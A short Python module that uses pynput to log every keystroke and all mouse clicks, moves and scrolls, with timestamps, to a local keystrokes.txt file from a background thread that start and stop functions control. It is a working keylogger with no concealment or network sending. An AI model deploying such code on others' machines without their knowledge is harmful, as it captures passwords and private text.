from pynput import keyboard, mouse
import os
from datetime import datetime
import threading

# === Setup log file ===
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, "keystrokes.txt")

# === Logging function ===
def log_to_file(message):
    with open(log_file, "a") as f:
        f.write(f"{message}\n")

# === Keyboard Callback ===
def on_key_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            log_to_file(f"Key Pressed: {key.char}")
        else:
            log_to_file(f"Special Key Pressed: [{key.name.upper()}]")
    except Exception as e:
        log_to_file(f"[Keyboard Error] {e}")

# === Mouse Callbacks ===
def on_click(x, y, button, pressed):
    if pressed:
        log_to_file(f"Mouse Click: {button} at ({x}, {y})")

def on_move(x, y):
    log_to_file(f"Mouse Moved to ({x}, {y})")

def on_scroll(x, y, dx, dy):
    log_to_file(f"Mouse Scrolled at ({x}, {y}) with delta ({dx}, {dy})")

# === Controller Variables ===
keyboard_listener = None
mouse_listener = None
logger_thread = None
running = False

def _run_listeners():
    global keyboard_listener, mouse_listener
    log_to_file(f"\n\n=== Logging Started at {datetime.now()} ===\n")
    
    keyboard_listener = keyboard.Listener(on_press=on_key_press)
    mouse_listener = mouse.Listener(
        on_click=on_click,
        on_move=on_move,
        on_scroll=on_scroll
    )

    keyboard_listener.start()
    mouse_listener.start()
    
    keyboard_listener.join()
    mouse_listener.join()

def start_logger():
    global logger_thread, running
    if not running:
        running = True
        logger_thread = threading.Thread(target=_run_listeners)
        logger_thread.start()

def stop_logger():
    global running, keyboard_listener, mouse_listener
    if running:
        if keyboard_listener: keyboard_listener.stop()
        if mouse_listener: mouse_listener.stop()
        running = False
        log_to_file(f"=== Logging Stopped at {datetime.now()} ===\n")

def is_running():
    return running
